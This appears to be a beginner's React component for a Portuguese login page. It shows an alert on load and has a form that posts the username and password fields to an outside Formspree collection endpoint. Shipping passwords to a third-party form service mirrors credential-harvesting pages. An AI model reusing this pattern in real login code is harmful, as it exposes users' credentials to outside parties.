
import './App.css'

function App() {
  { for(let i = 0; i < 1; i ++) {
    alert("pagina Login!")
}
}

  return (
    <>
    <div className="nav">
   
    </div>
    
      <div className='navbar'>

      <ul className='nav-links-desktop'>
        <li><a href="#">Inicio</a></li>
      </ul>

      </div>
      <div className='login'>
        <form action="https://formspree.io/f/mldelybk" method="POST" target="_blank">

          <h5>Faça o Seu Login!</h5>
          <input type="text" placeholder="Login" required="required" name="login"/><br/><p/>
          <input type="password" placeholder="Senha" required="required" name="senha"/><br/><p/>
          <button type="submit">Entrar</button>
        </form>
      </div>
      
      
    </>
  )
}

export default App
